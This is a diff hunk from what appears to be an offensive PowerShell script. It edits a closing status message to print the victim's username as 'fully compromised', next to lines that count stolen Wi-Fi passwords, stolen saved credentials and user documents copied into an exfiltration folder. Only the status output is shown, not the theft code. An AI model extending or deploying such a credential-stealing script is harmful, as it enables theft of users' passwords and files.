@@ -60,7 +60,7 @@ Write-Host "        Complete!" -ForegroundColor Green
 "
 
 "
-Write-Host "Script Complete! User is fully compromised!" -ForegroundColor Yellow -BackgroundColor DarkRed
+Write-Host "Script Complete! $env:USERNAME is fully compromised!" -ForegroundColor Yellow 
 Write-Host --- $AllSSIDs.Count Wi-Fi passwords stolen! -ForegroundColor Green -BackgroundColor Black
 Write-Host --- $CredStoreCreds.Count saved passwords stolen! -ForegroundColor Green -BackgroundColor Black
 $DocumentCount=(Get-ChildItem $ExfilPath\UserDocuments).count
